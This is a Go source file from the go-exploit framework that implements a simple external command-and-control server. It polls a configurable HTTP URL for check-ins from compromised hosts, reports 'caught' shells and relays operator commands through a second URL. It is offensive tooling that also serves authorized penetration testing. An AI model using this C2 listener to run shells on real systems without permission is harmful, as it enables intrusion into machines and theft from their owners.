package simpleexternal

import (
	"flag"
	"sync"
	"time"

	c2http "github.com/vulncheck-oss/go-exploit/c2/external"
	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/protocol"
)

type Server struct {
	ReadURL  string
	WriteURL string
}

var serverSingleton *Server

func GetInstance() *Server {
	if serverSingleton == nil {
		serverSingleton = new(Server)
	}

	return serverSingleton
}

func (externalHTTPServer *Server) CreateFlags() {
	flag.StringVar(&externalHTTPServer.ReadURL, "externalServer.ReadURL", "", "Where to read client incoming data from")
	flag.StringVar(&externalHTTPServer.WriteURL, "externalServer.WriteURL", "", "Where to write server commands to")
}

func (externalHTTPServer *Server) InitServer(lhost, readURL, writeURL string, port int, isClient bool) bool {
	return externalHTTPServer.Init(lhost, readURL, writeURL, port, isClient)
}

func (externalHTTPServer *Server) Init(_, readURL, writeURL string, port int, isClient bool) bool {
	if isClient {
		output.PrintFrameworkError("Called SimpleExternalServer as a client. Use lhost and lport.")

		return false
	}

	// Add external checkin /setup code here

	return true
}

// Listen for incoming.
func (externalHTTPServer *Server) Run(timeout int) {
	// mutex for user input
	var cliLock sync.Mutex

	// track if we got a shell or not
	success := false

	// terminate the server if no shells come in within timeout seconds
	go func() {
		time.Sleep(time.Duration(timeout) * time.Second)
		if !success {
			output.PrintFrameworkError("Timeout met. Shutting down shell listener.")
			//externalHTTPServer.Listener.Close()
			return
		}
	}()

	for {

		output.PrintFrameworkDebug("Checking for data on " + externalHTTPServer.ReadURL)
		_, body, ok := protocol.HTTPSendAndRecv("GET", externalHTTPServer.ReadURL, "")
		if !ok {
			return
		}
		if len(body) > 0 {
			if success == false {
				if body == "CHECKIN" {
					success = true
					output.PrintfFrameworkSuccess("Caught new shell from %v", externalHTTPServer.ReadURL)
				}
			}
			go handleExternalConn(&cliLock, externalHTTPServer.ReadURL, externalHTTPServer.WriteURL, body)
		}
		time.Sleep(3 * time.Second)
	}
}

func handleExternalConn(cliLock *sync.Mutex, readURL, writeURL, body string) {
	cliLock.Lock()
	defer cliLock.Unlock()

	output.PrintfFrameworkStatus("Active shell from %v", readURL)

	c2http.Basic(readURL, writeURL)
	output.PrintfFrameworkStatus("Stopped reading from %v", readURL)
	return
}
